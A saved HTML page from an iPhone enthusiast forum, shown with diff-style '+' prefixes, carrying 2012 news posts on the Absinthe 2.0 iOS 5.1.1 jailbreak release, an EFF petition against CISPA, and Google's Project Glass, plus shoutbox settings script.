+		<span class='right desc' title=''>(08 June 2012 - 01:22 PM)</span>
+		
+			AWESOME TO SEE EVERYONE AGAIN:blush:  <img src='http://i4iphones.info/public/style_emoticons/default/welcome.gif' class='bbc_emoticon' alt=':welcome:' /> back <img src='http://i4iphones.info/public/style_emoticons/default/blush.gif' class='bbc_emoticon' alt=':blush:' />
+		
+	</td>
+</tr>
+								</tbody>
+							</table>
+						</div>
+						<div id='shouts-global-resizer'></div>
+						<div id='shoutbox-inline-error-glb' class='message error block_wrap' style='display:none;'></div>
+					</td>
+				</tr>
+				
+		</table>
+	</div></div>
+</div>
+<br class="clear"/>
+<script type='text/javascript'>
+//<![CDATA[
+ipb.shoutbox.myMemberID       = parseInt(0);
+ipb.shoutbox.can_use          = parseInt(0);
+ipb.shoutbox.can_edit         = parseInt(0);
+ipb.shoutbox.flood_limit      = parseInt(10);
+ipb.shoutbox.bypass_flood     = parseInt(0);
+ipb.shoutbox.can_access_acp   = parseInt(0);
+ipb.shoutbox.view_archive     = true;
+ipb.shoutbox.enable_fade      = parseInt(1);
+ipb.shoutbox.inactive_timeout = parseInt(10);
+ipb.shoutbox.hide_refresh     = parseInt(1);
+ipb.shoutbox.members_refresh  = Array['shoutbox_members_viewing_refresh'] < 30 ? 30000 : parseInt(60)*1000;
+ipb.shoutbox.shouts_refresh   = Array['shoutbox_shouts_refresh'] < 30 ? 30000 : parseInt(60)*1000;
+ipb.shoutbox.total_shouts     = parseInt(2356);
+ipb.shoutbox.shout_order      = 'desc';
+ipb.shoutbox.moderator        = 0;
+
+ipb.shoutbox.my_prefs         = { 'shoutbox_height' : "275", 'shoutbox_gheight' : "132", 'global_display' : "1", 'enter_key_shout' : "1", 'enable_quick_commands' : "1", 'display_refresh_button' : "1" };
+ipb.shoutbox.img_disable      = parseInt(0);
+
+ipb.shoutbox.langs['mod_loaded_confirm'] = "Operation loaded, please confirm";
+ipb.shoutbox.langs['my_prefs_loaded'] = "Preferences loaded";
+ipb.shoutbox.langs['sb_archive'] = "Shoutbox Archive";
+ipb.shoutbox.langs['sb_archive_loaded'] = "Shoutbox Archive Loaded";
+ipb.shoutbox.langs['filtered'] = "Filtered";
+ipb.shoutbox.langs['page'] = "Page";
+ipb.shoutbox.langs['of'] = "of";
+ipb.shoutbox.langs['filter_member_name_status'] = "Filter the shouts by member name. Separate each name with a comma (,)";
+ipb.shoutbox.langs['prefs_restored'] = "Your preferences have been restored to the default preferences";
+ipb.shoutbox.langs['prefs_saved'] = "Preferences Saved";
+ipb.shoutbox.langs['filtering'] = "Filtering...";
+ipb.shoutbox.langs['mod_shout_edited'] = "Shout edited";
+ipb.shoutbox.langs['processing'] = "Processing, please wait...";
+ipb.shoutbox.langs['processed'] = "Processed";
+ipb.shoutbox.langs['saving_prefs'] = "Saving preferences...";
+ipb.shoutbox.langs['mod_opts_start_status'] = "Waiting for an action to be chosen...";
+ipb.shoutbox.langs['mod_opts_start_content'] = "This panel allows you to perform various actions based on your permissions. <br />To get started please select an action from below.<br /><br />";
+ipb.shoutbox.errors['blank_shout'] = "Your shout is empty.";
+ipb.shoutbox.errors['shout_too_big'] = "Your shout is too big, please shorten it";
+ipb.shoutbox.errors['no_cmds_enabled'] = "You do not have quick commands enabled. Open up your Preferences and enable quick commands.";
+ipb.shoutbox.errors['prefs_login'] = "You must be a member to edit/save your preferences, please login";
+ipb.shoutbox.errors['no_archive_perm'] = "You do not have permission to view the Shoutbox Archive!";
+ipb.shoutbox.errors['invalid_command'] = "That command isn't recognized, please check its syntax.";
+ipb.shoutbox.errors['mod_no_perm'] = "You don't have moderating permission to perform this function!";
+ipb.shoutbox.errors['mod_no_perms'] = "You don't have any moderating permissions!";
+ipb.shoutbox.errors['member_name_too_short'] = "The member name entered is shorter than 3 characters, please enter at least 3 characters for the member name.";
+ipb.shoutbox.errors['member_names_too_short'] = "The member names entered are all shorter than 3 characters. Please enter at least 3 characters per member name.";
+ipb.shoutbox.errors['no_acp_access'] = "You don't have ACP access!";
+ipb.shoutbox.errors['flooding'] = "Shout flooding is enabled. Please wait {#EXTRA#} seconds before shouting again.";
+ipb.shoutbox.errors['prune_invalid_number'] = "You have to insert a number after '/prune ' for the function to work!";
+ipb.shoutbox.errors['mod_invalid_name'] = "Invalid member name provided.";
+ipb.shoutbox.errors['mod_no_action'] = "An uknown moderation action was specified, please try again";
+ipb.shoutbox.errors['loading_members_viewing'] = "There was an error loading the members viewing the shoutbox!";
+ipb.shoutbox.errors['already_submitting'] = "A shout is already being submitted, please wait until the loading is complete";
+ipb.shoutbox.errors['already_filtering'] = "A shout filter is already being applied, please wait until the loading is completed";
+
+//]]>
+</script>
+
+
+
+<div class='ipsLayout ipsLayout_withright ipsLayout_largeright clearfix'>
+      <div class='ipsLayout_content clearfix'>
+    	   
+<div class='ipsBox clear'>
+
+    
+
+        <div class='ipsBox_container ipsPad'>        
+		
+            <a href='http://i4iphones.info/user/329296-bas1/' class='ipsUserPhotoLink left ipsPad_half'><img src='http://i4iphones.info/uploads/profile/photo-thumb-329296.jpg' alt=' Photo' class='ipsUserPhoto ipsUserPhoto_medium' /></a>
+		
+            <h2 class='ipsType_pagetitle'><a href='http://i4iphones.info/topic/22636-ios-511-jailbreak-untethered/'>iOS 5.1.1 Jailbreak Untethered</a></h2>
+            <div class='desc'>25 May 2012</div><br class='clear' />
+
+        
+            <div class='desc ipsType_smaller ipsPad_half'>		
+                Posted by <a hovercard-ref="member" hovercard-id="329296" class="_hovertrigger url fn" href='http://i4iphones.info/user/329296-bas1/' title='View Profile'>Bas1</a>
+                in <a href='http://i4iphones.info/forum/3-news-releases/'>News & Releases</a>
+            </div>
+
+            <div class='ipsType_textblock ipsPad'>
+                <p class='bbc_center'> <span rel='lightbox'><img src='http://www.iraqi-iphone.com/wp-content/uploads/2012/05/original.jpg' alt='Posted Image' class='bbc_img' /></span> </p> <br />
+<br />
+<strong class='bbc'> “After copious amounts of work and many sleepless nights,” the Chronic Dev Team led by Pod2g is proud to announce that “Absinthe 2.0 is finally here to jailbreak your device.” The effort was a collaborative one, where the iPhone Dev Team had much input as well.</strong> <br />
+<br />
+Launched officially at the Hack in the Box conference in Amsterdam (video available below courtesy of our security editor who is on location documenting everything coming out of the hackers&#39; mouths), “this release has been a large collaborative effort between Chronic-Dev Team and iPhone Dev Teams (Jailbreak Dream Team),” according to the latest update on greenpois0n.com.<br />
+<br />
+<br />
+ <strong class='bbc'> <span class='bbc_underline'> <p class='bbc_indent' style='margin-left: 40px;'>The tool only supports iOS 5.1.1 while iPad 2,4 models aren’t supported yet. </strong> </span></p>
+<br />
+<strong class='bbc'> <span class='bbc_underline'>  According to its makers, Absinthe 2.0 is “one of the most easiest jailbreaks to use (so easy your grandma could do it).” The tool supports the following configurations: iPad1,1 – 2,1 – 2,2 – 2,3 – 3,1 – 3,2 – 3,3; iPhone2,1 – 3,1 – 3,3 – 4,1; and iPod3,1 – 4,1. </strong> </span><br />
+<br />
+Despite being an easy hack to perform, users are still required to follow these exact steps to ensure that nothing goes wrong:<br />
+<br />
+<p class='citation'>Quote</p><div class="blockquote"><div class='quote'>1. Make a backup of your device in iTunes by right clicking on your device name under the ‘Devices’ menu and click ‘Back Up’.<br />
+<br />
+2. Once your backup is complete return to your device and go to Settings – General – Reset – Erase all Content and Settings. This will make the jailbreak process much faster.<br />
+<br />
+3. Open Absinthe and be sure you are still connected via USB cable to your computer.<br />
+<br />
+4. Click ‘Jailbreak’ and wait…. just be patient and do not disconnect your device.<br />
+<br />
+5. Once jailbroken return to iTunes and restore your backup from earlier. Right click on your device name under the ‘Devices’ menu in the left panel of iTunes and click ‘Restore from Back Up…’ then select the latest backup you created before. (restoring this backup will return all the content previously on your device ie, apps, photos, etc.)</div></div>
+<br />
+Here is the site where the links are located: <a href='http://greenpois0n.com/' class='bbc_url' title='External link' rel='nofollow external'>http://greenpois0n.com/</a>
+                <!--IBF.ATTACHMENT_98332-->
+            </div>
+            
+        </div>
+
+        <div class='general_box'>
+            <h3 class='ipsType_smaller'>
+            
+                <span class='right'>
+
+	<ul class='topic_share left shareButtons ipsList_inline'>
+	
+		<li><a href="http://i4iphones.info/index.php?sharelink=twitter;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNjM2LWlvcy01MTEtamFpbGJyZWFrLXVudGV0aGVyZWQv;aU9TIDUuMS4xIEphaWxicmVhayBVbnRldGhlcmVk" rel="nofollow" target="_blank" title="Share this link via Twitter" class='_slink' id='slink_twitter'><img src="http://i4iphones.info/public/style_extra/sharelinks/twitter.png" /></a></li>
+	
+
+		<li><a href="http://i4iphones.info/index.php?sharelink=facebook;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNjM2LWlvcy01MTEtamFpbGJyZWFrLXVudGV0aGVyZWQv;aU9TIDUuMS4xIEphaWxicmVhayBVbnRldGhlcmVk" rel="nofollow" target="_blank" title="Share this link via Facebook" class='_slink' id='slink_facebook'><img src="http://i4iphones.info/public/style_extra/sharelinks/facebook.png" /></a></li>
+	
+
+		<li><a href="http://i4iphones.info/index.php?sharelink=digg;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNjM2LWlvcy01MTEtamFpbGJyZWFrLXVudGV0aGVyZWQv;aU9TIDUuMS4xIEphaWxicmVhayBVbnRldGhlcmVk" rel="nofollow" target="_blank" title="Share this link via Digg" class='_slink' id='slink_digg'><img src="http://i4iphones.info/public/style_extra/sharelinks/digg.png" /></a></li>
+	
+
+		<li><a href="http://i4iphones.info/index.php?sharelink=buzz;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNjM2LWlvcy01MTEtamFpbGJyZWFrLXVudGV0aGVyZWQv;aU9TIDUuMS4xIEphaWxicmVhayBVbnRldGhlcmVk" rel="nofollow" target="_blank" title="Share this link via Buzz" class='_slink' id='slink_buzz'><img src="http://i4iphones.info/public/style_extra/sharelinks/buzz.png" /></a></li>
+	
+
+		<li><a href="http://i4iphones.info/index.php?sharelink=delicious;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNjM2LWlvcy01MTEtamFpbGJyZWFrLXVudGV0aGVyZWQv;aU9TIDUuMS4xIEphaWxicmVhayBVbnRldGhlcmVk" rel="nofollow" target="_blank" title="Share this link via Del.icio.us" class='_slink' id='slink_delicious'><img src="http://i4iphones.info/public/style_extra/sharelinks/delicious.png" /></a></li>
+	
+
+		<li><a href="http://i4iphones.info/index.php?sharelink=reddit;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNjM2LWlvcy01MTEtamFpbGJyZWFrLXVudGV0aGVyZWQv;aU9TIDUuMS4xIEphaWxicmVhayBVbnRldGhlcmVk" rel="nofollow" target="_blank" title="Share this link via Reddit" class='_slink' id='slink_reddit'><img src="http://i4iphones.info/public/style_extra/sharelinks/reddit.png" /></a></li>
+	
+
+		<li><a href="http://i4iphones.info/index.php?sharelink=stumble;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNjM2LWlvcy01MTEtamFpbGJyZWFrLXVudGV0aGVyZWQv;aU9TIDUuMS4xIEphaWxicmVhayBVbnRldGhlcmVk" rel="nofollow" target="_blank" title="Share this link via StumbleUpon" class='_slink' id='slink_stumble'><img src="http://i4iphones.info/public/style_extra/sharelinks/stumble.png" /></a></li>
+	
+
+		<li><a href="http://i4iphones.info/index.php?sharelink=email;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNjM2LWlvcy01MTEtamFpbGJyZWFrLXVudGV0aGVyZWQv;aU9TIDUuMS4xIEphaWxicmVhayBVbnRldGhlcmVk" rel="nofollow" target="_blank" title="Share this link via Email" class='_slink' id='slink_email'><img src="http://i4iphones.info/public/style_extra/sharelinks/email.png" /></a></li>
+	
+
+		<li><a href="http://i4iphones.info/index.php?sharelink=print;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNjM2LWlvcy01MTEtamFpbGJyZWFrLXVudGV0aGVyZWQv;aU9TIDUuMS4xIEphaWxicmVhayBVbnRldGhlcmVk" rel="nofollow" target="_blank" title="Print" class='_slink' id='slink_print'><img src="http://i4iphones.info/public/style_extra/sharelinks/print.png" /></a></li>
+	
+
+		<li><a href="http://i4iphones.info/index.php?sharelink=download;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNjM2LWlvcy01MTEtamFpbGJyZWFrLXVudGV0aGVyZWQv;aU9TIDUuMS4xIEphaWxicmVhayBVbnRldGhlcmVk" rel="nofollow" target="_blank" title="Download" class='_slink' id='slink_download'><img src="http://i4iphones.info/public/style_extra/sharelinks/download.png" /></a></li>
+	
+	</ul>
+	<script type="text/javascript">
+		ipb.sharelinks.url   = "http://i4iphones.info/topic/22636-ios-511-jailbreak-untethered/";
+		ipb.sharelinks.title = "iOS 5.1.1 Jailbreak Untethered";
+		ipb.sharelinks.bname = "i4iPhones";
+	</script>
+</span>
+
+                3432 Views &middot;
+                0 Replies
+	
+                
+                	
+            </h3>
+                        
+	</div>
+
+
+
+
+        <div class='ipsBox_container ipsPad'>        
+		
+            <a href='http://i4iphones.info/user/64258-t%cc%b6o%cc%b6o%cc%b6l%cc%b6/' class='ipsUserPhotoLink left ipsPad_half'><img src='http://i4iphones.info/uploads/av-64258.jpg' alt=' Photo' class='ipsUserPhoto ipsUserPhoto_medium' /></a>
+		
+            <h2 class='ipsType_pagetitle'><a href='http://i4iphones.info/topic/22611-cispa-and-the-end-of-privacy-on-the-internet/'>CISPA and the END of privacy on the internet</a></h2>
+            <div class='desc'>23 Apr 2012</div><br class='clear' />
+
+        
+            <div class='desc ipsType_smaller ipsPad_half'>		
+                Posted by <a hovercard-ref="member" hovercard-id="64258" class="_hovertrigger url fn" href='http://i4iphones.info/user/64258-t%cc%b6o%cc%b6o%cc%b6l%cc%b6/' title='View Profile'>T̶o̶o̶L̶</a>
+                in <a href='http://i4iphones.info/forum/3-news-releases/'>News & Releases</a>
+            </div>
+
+            <div class='ipsType_textblock ipsPad'>
+                <a href='https://www.eff.org/' class='bbc_url' title='External link' rel='nofollow external'><img src='https://action.eff.org/o/9042/images/logo.png' alt='Posted Image' class='bbc_img' /></a><br />
+<br />
+<strong class='bbc'><a href='https://www.eff.org/' class='bbc_url' title='External link' rel='nofollow external'>Electronic Frontier Foundation</a></strong><br />
+Defending your rights in the digital world<br />
+<br />
+<br />
+<span style='font-size: 18px;'><strong class='bbc'>	Don’t Let Congress Use &quot;Cybersecurity&quot; Fears to Trample on Civil Liberties</strong></span><br />
+<br />
+<span style='font-size: 14px;'>Congress is considering legislation that would create backdoor wiretaps into our daily communications. These “cybersecurity” bills would give companies a free pass to monitor and collect communications, including huge amounts of personal data like your text messages and emails. Companies could ship that data wholesale to the government or anyone else provided they claim it was for &quot;cybersecurity purposes.&quot; Tell Congress that they can’t use vaguely defined &quot;cybersecurity threats&quot; as a shortcut to shredding the Constitution.</span><br />
+<br />
+<span style='font-size: 14px;'>Under Rep. Mike Rogers’ <em class='bbc'>Cyber Intelligence Sharing and Protection Act of 2011</em> (CISPA),and Sen. John McCain’s <em class='bbc'>SECURE IT Act</em>, there are almost no restrictions on what information can be spied upon and how it can be used. That means a company like Google, Facebook, Twitter, or AT&amp;T could intercept your emails and text messages, send copies to one another and to the government, and modify those communications or prevent them from reaching their destination if it fits into their plan to stop “cybersecurity” threats.</span><br />
+<br />
+<span style='font-size: 14px;'>Worst of all, the stated definition of &quot;cybersecurity purpose&quot; is so broad that it leaves the door open to censor any speech that a company believes would &quot;degrade the network.&quot;  Parts of the proposed legislation specifically state that cybersecurity purpose includes protecting against the theft or misappropriation of private or government information. Such sweeping language would give companies and the government a <strong class='bbc'>powerful weapon to use against whistleblower websites like WikiLeaks</strong>.</span><br />
+<br />
+<span style='font-size: 14px;'>Congress wants to use the threat of &quot;cybersecurity&quot; to undermine our Constitutional rights. Tell your lawmakers that we won’t stand for dangerous, unsupervised information sharing under the guise of cybersecurity.</span><br />
+<br />
+<span style='font-size: 18px;'>Please Sign the petition below if you care about your privacy at all&#33;</span><br />
+<a href='https://wfc2.wiredforchange.com/o/9042/p/dia/action/public/?action_KEY=8444' class='bbc_url' title='External link' rel='nofollow external'>https://wfc2.wiredfo...action_KEY=8444</a>
+                <!--IBF.ATTACHMENT_97588-->
+            </div>
+            
+        </div>
+
+        <div class='general_box'>
+            <h3 class='ipsType_smaller'>
+            
+                <span class='right'>
+
+	<ul class='topic_share left shareButtons ipsList_inline'>
+	
+		<li><a href="http://i4iphones.info/index.php?sharelink=twitter;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNjExLWNpc3BhLWFuZC10aGUtZW5kLW9mLXByaXZhY3ktb24tdGhlLWludGVybmV0Lw,,;Q0lTUEEgYW5kIHRoZSBFTkQgb2YgcHJpdmFjeSBvbiB0aGUgaW50ZXJuZXQ," rel="nofollow" target="_blank" title="Share this link via Twitter" class='_slink' id='slink_twitter'><img src="http://i4iphones.info/public/style_extra/sharelinks/twitter.png" /></a></li>
+	
+
+		<li><a href="http://i4iphones.info/index.php?sharelink=facebook;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNjExLWNpc3BhLWFuZC10aGUtZW5kLW9mLXByaXZhY3ktb24tdGhlLWludGVybmV0Lw,,;Q0lTUEEgYW5kIHRoZSBFTkQgb2YgcHJpdmFjeSBvbiB0aGUgaW50ZXJuZXQ," rel="nofollow" target="_blank" title="Share this link via Facebook" class='_slink' id='slink_facebook'><img src="http://i4iphones.info/public/style_extra/sharelinks/facebook.png" /></a></li>
+	
+
+		<li><a href="http://i4iphones.info/index.php?sharelink=digg;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNjExLWNpc3BhLWFuZC10aGUtZW5kLW9mLXByaXZhY3ktb24tdGhlLWludGVybmV0Lw,,;Q0lTUEEgYW5kIHRoZSBFTkQgb2YgcHJpdmFjeSBvbiB0aGUgaW50ZXJuZXQ," rel="nofollow" target="_blank" title="Share this link via Digg" class='_slink' id='slink_digg'><img src="http://i4iphones.info/public/style_extra/sharelinks/digg.png" /></a></li>
+	
+
+		<li><a href="http://i4iphones.info/index.php?sharelink=buzz;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNjExLWNpc3BhLWFuZC10aGUtZW5kLW9mLXByaXZhY3ktb24tdGhlLWludGVybmV0Lw,,;Q0lTUEEgYW5kIHRoZSBFTkQgb2YgcHJpdmFjeSBvbiB0aGUgaW50ZXJuZXQ," rel="nofollow" target="_blank" title="Share this link via Buzz" class='_slink' id='slink_buzz'><img src="http://i4iphones.info/public/style_extra/sharelinks/buzz.png" /></a></li>
+	
+
+		<li><a href="http://i4iphones.info/index.php?sharelink=delicious;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNjExLWNpc3BhLWFuZC10aGUtZW5kLW9mLXByaXZhY3ktb24tdGhlLWludGVybmV0Lw,,;Q0lTUEEgYW5kIHRoZSBFTkQgb2YgcHJpdmFjeSBvbiB0aGUgaW50ZXJuZXQ," rel="nofollow" target="_blank" title="Share this link via Del.icio.us" class='_slink' id='slink_delicious'><img src="http://i4iphones.info/public/style_extra/sharelinks/delicious.png" /></a></li>
+	
+
+		<li><a href="http://i4iphones.info/index.php?sharelink=reddit;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNjExLWNpc3BhLWFuZC10aGUtZW5kLW9mLXByaXZhY3ktb24tdGhlLWludGVybmV0Lw,,;Q0lTUEEgYW5kIHRoZSBFTkQgb2YgcHJpdmFjeSBvbiB0aGUgaW50ZXJuZXQ," rel="nofollow" target="_blank" title="Share this link via Reddit" class='_slink' id='slink_reddit'><img src="http://i4iphones.info/public/style_extra/sharelinks/reddit.png" /></a></li>
+	
+
+		<li><a href="http://i4iphones.info/index.php?sharelink=stumble;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNjExLWNpc3BhLWFuZC10aGUtZW5kLW9mLXByaXZhY3ktb24tdGhlLWludGVybmV0Lw,,;Q0lTUEEgYW5kIHRoZSBFTkQgb2YgcHJpdmFjeSBvbiB0aGUgaW50ZXJuZXQ," rel="nofollow" target="_blank" title="Share this link via StumbleUpon" class='_slink' id='slink_stumble'><img src="http://i4iphones.info/public/style_extra/sharelinks/stumble.png" /></a></li>
+	
+
+		<li><a href="http://i4iphones.info/index.php?sharelink=email;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNjExLWNpc3BhLWFuZC10aGUtZW5kLW9mLXByaXZhY3ktb24tdGhlLWludGVybmV0Lw,,;Q0lTUEEgYW5kIHRoZSBFTkQgb2YgcHJpdmFjeSBvbiB0aGUgaW50ZXJuZXQ," rel="nofollow" target="_blank" title="Share this link via Email" class='_slink' id='slink_email'><img src="http://i4iphones.info/public/style_extra/sharelinks/email.png" /></a></li>
+	
+
+		<li><a href="http://i4iphones.info/index.php?sharelink=print;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNjExLWNpc3BhLWFuZC10aGUtZW5kLW9mLXByaXZhY3ktb24tdGhlLWludGVybmV0Lw,,;Q0lTUEEgYW5kIHRoZSBFTkQgb2YgcHJpdmFjeSBvbiB0aGUgaW50ZXJuZXQ," rel="nofollow" target="_blank" title="Print" class='_slink' id='slink_print'><img src="http://i4iphones.info/public/style_extra/sharelinks/print.png" /></a></li>
+	
+
+		<li><a href="http://i4iphones.info/index.php?sharelink=download;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNjExLWNpc3BhLWFuZC10aGUtZW5kLW9mLXByaXZhY3ktb24tdGhlLWludGVybmV0Lw,,;Q0lTUEEgYW5kIHRoZSBFTkQgb2YgcHJpdmFjeSBvbiB0aGUgaW50ZXJuZXQ," rel="nofollow" target="_blank" title="Download" class='_slink' id='slink_download'><img src="http://i4iphones.info/public/style_extra/sharelinks/download.png" /></a></li>
+	
+	</ul>
+	<script type="text/javascript">
+		ipb.sharelinks.url   = "http://i4iphones.info/topic/22611-cispa-and-the-end-of-privacy-on-the-internet/";
+		ipb.sharelinks.title = "CISPA and the END of privacy on the internet";
+		ipb.sharelinks.bname = "i4iPhones";
+	</script>
+</span>
+
+                2066 Views &middot;
+                2 Replies
+	
+                ( Last reply by <a href='http://i4iphones.info/user/57673-tone13capone/'>Tone13capone</a> )
+                	
+            </h3>
+                        
+	</div>
+
+
+
+
+        <div class='ipsBox_container ipsPad'>        
+		
+            <a href='http://i4iphones.info/user/48171-daveenjay/' class='ipsUserPhotoLink left ipsPad_half'><img src='http://i4iphones.info/uploads/av-48171.jpg' alt=' Photo' class='ipsUserPhoto ipsUserPhoto_medium' /></a>
+		
+            <h2 class='ipsType_pagetitle'><a href='http://i4iphones.info/topic/22594-googles-project-glass-fail/'>Google&#39;s Project Glass FAIL</a></h2>
+            <div class='desc'>07 Apr 2012</div><br class='clear' />
+
+        
+            <div class='desc ipsType_smaller ipsPad_half'>		
+                Posted by <a hovercard-ref="member" hovercard-id="48171" class="_hovertrigger url fn" href='http://i4iphones.info/user/48171-daveenjay/' title='View Profile'>DaveenJay</a>
+                in <a href='http://i4iphones.info/forum/3-news-releases/'>News & Releases</a>
+            </div>
+
+            <div class='ipsType_textblock ipsPad'>
+                <p class='bbc_left'><object style="height: 280px; width: 250px"><param name="movie" value="http://youtube.com/v/XuNzZn_LJ4Q?version=3" /><param name="allowFullScreen" value="true" /><param name="allowScriptAccess" value="always" /><embed src="http://youtube.com/v/XuNzZn_LJ4Q?version=3" type="application/x-shockwave-flash" allowfullscreen="true" allowScriptAccess="always" width="280" height="250"></embed></object></p>
+<br />
+<p class='bbc_left'>The prototype digital glasses, unveiled on the company&#39;s Google+ social network on Wednesday, are still being tweaked and tested, and are not available in stores yet.</p>
+<br />
+<br />
+<p class='bbc_left'><span style='font-family: arial, sans-serif'><span style='font-size: 12px;'>&quot;We&#39;re sharing this information now because we want to start a conversation and learn from your valuable input,&quot; Google wrote in a post on a Google+ page devoted to Project Glass.</span></span></p>
+<br />
+<br />
+<p class='bbc_left'><span style='font-family: arial, sans-serif'><span style='font-size: 12px;'>The spectacles are being developed by Google, the secretive group working on advanced research projects such as self-driving cars.</span></span></p>
+<br />
+<br />
+<p class='bbc_left'><span style='font-family: arial, sans-serif'><span style='font-size: 12px;'>The Google+ page featured a 2-1/2 minute video, shot from the perspective of someone wearing the glasses. The wearer goes about his day walking through New York City while speaking commands to the glasses to do things such as take a photo and post it to Google+, get block-by-block directions and weather conditions and get a pop-up alert when a friend is nearby.</span></span></p>
+<br />
+<br />
+<p class='bbc_left'><span style='font-family: arial, sans-serif'><span style='font-size: 12px;'>The Google posting is intended to show &quot;what this technology could look like,&quot; the company said. Mock-up images of the glasses on the Google+ page depict a stamp-sized digital display that seems attached to a pair of glasses and sits at the top corner of one of the lenses.</span></span></p>
+<br />
+<br />
+<p class='bbc_left'><span style='font-family: arial, sans-serif'><span style='font-size: 12px;'>The post asks people to submit their suggestions for what they would like to see in the glasses.</span></span></p>
+<br />
+<br />
+<p class='bbc_left'><span style='font-family: arial, sans-serif'><span style='font-size: 12px;'>Google, the world&#39;s No. 1 search engine, is famous for letting its employees work on ambitious projects that don&#39;t always have a direct relation to its business.</span></span></p>
+<br />
+<br />
+<p class='bbc_left'><span style='font-family: arial, sans-serif'><span style='font-size: 12px;'>Those projects have not always sat well with investors, who worry about Google&#39;s spending on projects with uncertain returns.</span></span></p>
+<br />
+<br />
+<p class='bbc_left'><span style='font-family: arial, sans-serif'><span style='font-size: 12px;'>Google Chief Executive Larry Page has cut down on many of the projects and products underway at the company since taking the reins a year ago. But he has defended Google&#39;s commitment to working on &quot;speculative&quot; projects that could one day turn into &quot;billion-dollar businesses,&quot; though he has stressed the company isn&#39;t &quot;betting the farm&quot; on such efforts.</span></span></p>
+<br />
+<br />
+<p class='bbc_left'><span style='font-family: arial, sans-serif'><span style='font-size: 12px;'>The glasses could provide a way for Google to more closely entwine its advertising-supported online services, including Web searches, maps and email, into people&#39;s daily lives.</span></span></p>
+<br />
+<br />
+<p class='bbc_left'><span style='font-family: arial, sans-serif'><span style='font-size: 12px;'>The glasses also could help Google match some of the buzz that rival Apple Inc has generated with its latest iPhone and the built-in Siri digital assistant, which takes spoken commands to do such tasks as schedule calendar appointments and get weather forecasts.</span></span></p>
+<br />
+<br />
+<p class='bbc_left'><span style='font-family: arial, sans-serif'><span style='font-size: 12px;'>A Google insider said it is unclear when the glasses might be commercially available, but noted that the philosophy of Google group is to develop technologies that can be used in a relatively short period of time, rather than dreaming up creations that won&#39;t be possible for 10 or more years.</span></span></p>
+<br />
+<br />
+<p class='bbc_left'><span style='font-family: arial, sans-serif'><span style='font-size: 12px;'>The glasses, under development for two years, will be tested in public by members of the Google team, according to the Google insider.</span></span></p>
+<br />
+<br />
+<p class='bbc_left'><span style='font-family: arial, sans-serif'><span style='font-size: 12px;'>Shares of Google, which reports its first quarter financial results next week, fell about 1.2 per cent to close at &#036;635.15 on Wednesday amid a broad market sell-off.</span></span></p>
+                <!--IBF.ATTACHMENT_97224-->
+            </div>
+            
+        </div>
+
+        <div class='general_box'>
+            <h3 class='ipsType_smaller'>
+            
+                <span class='right'>
+
+	<ul class='topic_share left shareButtons ipsList_inline'>
+	
+		<li><a href="http://i4iphones.info/index.php?sharelink=twitter;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNTk0LWdvb2dsZXMtcHJvamVjdC1nbGFzcy1mYWlsLw,,;R29vZ2xlJiMzOTtzIFByb2plY3QgR2xhc3MgRkFJTA,," rel="nofollow" target="_blank" title="Share this link via Twitter" class='_slink' id='slink_twitter'><img src="http://i4iphones.info/public/style_extra/sharelinks/twitter.png" /></a></li>
+	
+
+		<li><a href="http://i4iphones.info/index.php?sharelink=facebook;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNTk0LWdvb2dsZXMtcHJvamVjdC1nbGFzcy1mYWlsLw,,;R29vZ2xlJiMzOTtzIFByb2plY3QgR2xhc3MgRkFJTA,," rel="nofollow" target="_blank" title="Share this link via Facebook" class='_slink' id='slink_facebook'><img src="http://i4iphones.info/public/style_extra/sharelinks/facebook.png" /></a></li>
+	
+
+		<li><a href="http://i4iphones.info/index.php?sharelink=digg;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNTk0LWdvb2dsZXMtcHJvamVjdC1nbGFzcy1mYWlsLw,,;R29vZ2xlJiMzOTtzIFByb2plY3QgR2xhc3MgRkFJTA,," rel="nofollow" target="_blank" title="Share this link via Digg" class='_slink' id='slink_digg'><img src="http://i4iphones.info/public/style_extra/sharelinks/digg.png" /></a></li>
+	
+
+		<li><a href="http://i4iphones.info/index.php?sharelink=buzz;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNTk0LWdvb2dsZXMtcHJvamVjdC1nbGFzcy1mYWlsLw,,;R29vZ2xlJiMzOTtzIFByb2plY3QgR2xhc3MgRkFJTA,," rel="nofollow" target="_blank" title="Share this link via Buzz" class='_slink' id='slink_buzz'><img src="http://i4iphones.info/public/style_extra/sharelinks/buzz.png" /></a></li>
+	
+
+		<li><a href="http://i4iphones.info/index.php?sharelink=delicious;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNTk0LWdvb2dsZXMtcHJvamVjdC1nbGFzcy1mYWlsLw,,;R29vZ2xlJiMzOTtzIFByb2plY3QgR2xhc3MgRkFJTA,," rel="nofollow" target="_blank" title="Share this link via Del.icio.us" class='_slink' id='slink_delicious'><img src="http://i4iphones.info/public/style_extra/sharelinks/delicious.png" /></a></li>
+	
+
